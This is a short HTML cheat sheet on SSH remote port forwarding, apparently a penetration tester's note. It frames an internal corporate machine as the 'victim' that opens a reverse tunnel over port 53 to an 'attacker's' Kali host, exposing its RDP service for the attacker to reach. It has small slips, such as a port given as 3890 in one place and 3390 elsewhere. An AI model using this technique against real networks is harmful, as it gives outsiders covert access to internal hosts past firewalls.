<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>SSH Remote Port Forwarding</title>
</head><body><b><u>SSH Remote Port Forwarding<br/>
<br/>
</u></b><b>Info:</b>&nbsp;Tunnel a remote port to a locoal server using SSH. <br/>
<br/>
<b>Program: </b>SSH<br/>
<br/>
<b>Set Up:<br/>
<br/>
On Machine B run the ssh daemon on port 53:<br/>
<br/>
</b>root@kali:~# /etc/ssh/sshd_config<br/>
<br/>
# What ports, IPs and protocols we listen for<br/>
Port 53<br/>
<br/>
root@kali:~# /etc/init.d/ssh restart<br/>
<br/>
<br/>
<b>On Machine A run the ssh command:</b><br/>
<br/>
ssh &lt;gateway&gt; -R &lt;remote port to bind&gt;:&lt;local host&gt;:&lt;local port&gt;<br/>
<br/>
ssh a.b.c.d -R 3390:127.0.0.1:3389 -p 53<br/>
<br/>
<b>Note: </b><br/>
<br/>
Gateway&#09;&#09;&#09;&#09;=&#09;Machine B ip address<br/>
-R&#09;&#09;&#09;&#09;&#09;= &#09;Remote Port Forwarding<br/>
Remote Port To Bind&#09;= &#09;The port on Machine B that will be used to connect to Machine A's RDP service<br/>
Local host&#09;&#09;&#09;= &#09;the local ip address of Machine A<br/>
Local port &#09;&#09;&#09;= &#09;The port of Machine A to tunnel<br/>
-p&#09;&#09;&#09;&#09;&#09;= &#09;Port of Machine B SSH server<br/>
<br/>
<br/>
<b>On Machine B run</b><br/>
<br/>
root@kali:~# rdesktop 127.0.0.1:3390<br/>
<br/>
<br/>
<b>Usage</b><br/>
<br/>
<b>Situation:</b>&nbsp;Machine A is an internal non-routeable machine in a corporate network with a Window's RDP service on port 3389. <br/>
<br/>
Victim's machine&#09;&#09;Attacker's Machine <br/>
<br/>
Machine A &lt;----------------&gt; Machine B<br/>
<br/>
Machine A &lt;-------------------&gt; a.b.c.d <br/>
<br/>
<br/>
<b>Machine B sets up SSH daemon on port 53</b><br/>
<b>Machine A SSH connects to Machine B on port 53 using the remote port fowarding method, setting the gateway as Machine B, the remote port to bind as 3890, the local host as 127.0.0.1, and the local port to 3389 &nbsp;(RDP)</b><br/>
<b>Machine B RDP's to 127.0.0.1:3390 which sends the traffic through the SSH tunnel, to Machine A, which sends the traffic to it's RDP service on port 3389. </b><br/>
<br/>
</body></html>